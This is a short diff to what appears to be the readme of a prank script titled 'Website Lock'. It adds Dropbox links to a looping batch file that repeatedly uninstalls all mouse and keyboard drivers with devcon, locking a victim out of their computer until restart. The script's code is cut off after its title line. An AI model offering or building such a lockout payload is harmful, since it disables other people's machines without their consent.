@@ -1,6 +1,9 @@
 The explanation is in the code.
 Link to other files: https://www.dropbox.com/sh/i09leu4kcifta6a/AACEFYQnlOIUsDtLLrQuemCha?dl=0 (same link as the one in the code)
 
+Side note: If you want to be a bastard and prevent them from using any mouse and keyboard at all until they restart here is the link to a looping version of the batch file: https://www.dropbox.com/s/czlyh93ga3myb8m/TheRealAnnoyance.bat?dl=0
+It continually does a devcon command to uninstall all mouse and keyboard drivers--even if they were just installed. 
+
 Code:
 ```
 REM Title: Website Lock
